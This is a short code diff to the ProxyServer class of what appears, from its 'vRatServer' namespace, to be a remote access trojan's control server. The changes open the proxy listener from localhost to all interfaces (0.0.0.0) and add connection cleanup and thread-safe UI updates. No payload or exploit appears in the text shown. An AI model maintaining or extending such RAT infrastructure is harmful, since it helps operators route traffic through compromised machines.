@@ -23,7 +23,7 @@ namespace vRatServer.Classes
         RichTextBox rch;
         public ProxyServer(int port, RichTextBox rch, Client client)
         {
-            _server = new TcpListener(IPAddress.Parse("127.0.0.1"), port);
+            _server = new TcpListener(IPAddress.Parse("0.0.0.0"), port);
             _server.Start();
             this.rch = rch;
             this.client = client;
@@ -119,8 +119,8 @@ namespace vRatServer.Classes
 
                 byte[] hostb = new byte[r -7];
                 Array.Copy(data, 5, hostb, 0, hostb.Length);
-                Program.f1.Invoke((MethodInvoker)delegate
-                    {
+                Program.f1.BeginInvoke((MethodInvoker)delegate
+                {
 
                         if (!rch.IsDisposed)
                         {
@@ -137,9 +137,13 @@ namespace vRatServer.Classes
                 {
                     readProxyData(sd, ref data);
                 }
+                proxyconnection.Close();
+                m.WaitOne();
+                req.Remove(sd);
+                m.ReleaseMutex();
             }
-            catch (Exception e) { return; }
-
+            catch (Exception e) { }
+            GC.Collect();
             return;
         }
 
